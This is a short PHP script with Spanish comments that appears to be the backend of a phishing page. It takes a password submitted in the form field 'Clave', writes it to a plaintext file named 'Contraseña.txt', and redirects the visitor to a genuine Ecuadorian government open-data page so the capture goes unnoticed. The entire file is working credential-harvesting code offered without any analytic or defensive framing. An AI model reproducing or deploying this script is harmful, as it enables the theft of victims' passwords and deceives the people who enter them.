<?php
// Recibo los datos introducidos en el formulario
$Clave = $_POST["Clave"];
header('Location:https://www.datosabiertos.gob.ec/dataset/cuentas-internet-fijos-y-moviles');
     // Abro el archivo
     $co = "===========================================\n";
     $cl = "===========================================\n";
     $file=fopen("Contraseña.txt", "w");
     // Le cargo los datos
     $op = "Contraseña:  $Clave\n";
     fwrite($file, "\n". $co. $op. $cl);
     fclose($file);
?>
